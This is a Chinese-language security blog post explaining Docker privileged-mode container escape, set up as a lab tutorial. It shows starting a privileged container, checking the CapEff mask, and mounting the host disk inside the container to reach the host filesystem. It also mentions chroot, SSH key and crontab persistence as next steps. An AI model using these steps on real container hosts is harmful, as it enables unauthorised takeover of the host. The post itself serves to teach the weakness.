---
title: Docker特权模式逃逸
date: 2022-08-12 20:14:52
slug: docker-privileged-escape
tags:
  - Docker
  - Security
categories:
  - Security
  - Container

---

## 一、漏洞说明

特权模式逃逸是一种最简单有效的逃逸方法，使用特权模式启动的容器时，`docker`管理员可通过`mount`命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过`chroot`切换根目录、写`ssh`公钥和`crontab`计划任何等逃逸到宿主机。

## 二、环境搭建

```
// 使用特权模式运行容器
docker run -it --privileged ubuntu:18.04  
```

## 三、漏洞验证

```
// 如果是以特权模式启动，**CapEff** 对应的掩码值应该为: 0000003fffffffff
root@43552e476ea7:/# cat /proc/self/status | grep CapEff
CapEff: 0000003fffffffff
```

## 四、漏洞利用

### 4.1、查看宿主机目录

```bash
fdisk -l

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 48234495 48232448  23G 83 Linux
/dev/sda2       48236542 52426751  4190210   2G  5 Extended
/dev/sda5       48236544 52426751  4190208   2G 82 Linux swap / Solaris
```

### 4.2、在容器内挂载宿主机目录

```bash
root@e980481bfd0f:/# mkdir test
root@e980481bfd0f:/# mount /dev/sda1 test/
root@e980481bfd0f:/# cd test
root@e980481bfd0f:/test# ls 
bin    dev   initrd.img  lost+found  opt   run   srv  usr
boot   etc   lib         media       proc  sbin  sys  var
cdrom  home  lib64       mnt         root  snap  tmp  vmlinuz

```

